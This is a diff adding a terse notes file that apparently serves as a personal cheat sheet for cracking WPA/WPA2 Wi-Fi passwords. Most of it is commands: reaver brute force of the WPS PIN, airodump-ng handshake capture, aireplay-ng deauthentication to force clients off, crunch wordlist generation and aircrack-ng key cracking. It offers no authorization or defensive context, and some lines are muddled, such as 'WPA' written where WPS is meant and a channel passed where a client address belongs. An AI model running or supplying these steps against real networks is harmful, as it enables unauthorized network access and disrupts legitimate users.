@@ -1,0 +1,37 @@
+//WPA was made to address the issues that WEP presented and to provide better encryption. The main issue with WEP was the short IV which means that they can be repeated, hence a large amount of them can easily determine the key stream and the WEP key.
+//WPA has each packet encrypted with a unique temporary key. Which means that it does not matter what amount of packets we collect.
+//WPA and WPA2 are similar except WPA2 uses an algorithm called CCMP
+//We can crack it using WPS. Using bruteforce it can be cracked in less than 10 hours
+
+wash -i mon
+
+reaver -b (NETWORKMACADRESS) -c (NETWORKCHANNEL) -i mon0
+
+//Sometimes the router may lock you out after a certain amount of fails
+go to
+
+reaver -help
+
+and mess around with the advanced option
+
+//If WPA is not enabled then we can try to capture the handshake between the client and the AP, then use a word-list against the handshake to determine the key
+
+airodump-ng mon0
+
+airodump-ng --bssid (NETWORKMAC) --channel (NETWORKCHANNEL) --write handshake mon0
+
+//Now wait for clients to connect OR use Deauth to speed up the process
+
+aireplay-ng --deauth 4 -a (NETWORKMAC) -c (NETWORKCHANNEL) mon0
+
+//Now you have the handshake, you can try to use that with a wordlist to crack the WPA key
+
+//Creating a wordlist
+//How to use crunch
+
+crunch [min] [max] [characters=lower|upper|numbers|symbols] -t [pattern] -o [filesave]
+ex: crunch 6 8 123456!"$*# -o wordlist -t a@@@@@b
+
+//Use the wordlist to brute force
+
+aircrack-ng handshake-01.cap -w wordlist
